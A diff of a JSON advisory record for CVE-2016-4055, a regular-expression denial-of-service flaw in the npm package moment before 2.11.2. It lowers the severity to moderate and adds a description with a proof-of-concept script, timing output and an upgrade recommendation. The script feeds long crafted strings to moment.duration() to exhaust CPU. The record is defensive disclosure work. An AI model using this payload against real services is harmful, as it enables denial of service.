@@ -1,5 +1,5 @@
 {
-  "Severity": "HIGH",
+  "Severity": "MODERATE",
   "UpdatedAt": "2017-10-24T18:33:35Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -27,12 +27,12 @@
         "Value": "CVE-2016-4055"
       }
     ],
-    "Description": "The duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a \"regular expression Denial of Service (ReDoS).\"",
+    "Description": "Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.\n\n\n## Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i\u003c=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i\u003c=10000000;i=i+10000) {\n    console.log(\"COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH: 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH: 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH: 60006\n[ 5, 651335262 ]\n```\n\n\n## Recommendation\n\nPlease update to version 2.11.2 or later. ",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2017-10-24T18:33:35Z",
-    "Severity": "HIGH",
-    "Summary": "High severity vulnerability that affects moment",
-    "UpdatedAt": "2019-07-03T21:01:59Z",
+    "Severity": "MODERATE",
+    "Summary": "Regular Expression Denial of Service in moment",
+    "UpdatedAt": "2020-08-31T18:09:31Z",
     "WithdrawnAt": ""
   },
   "Versions": [
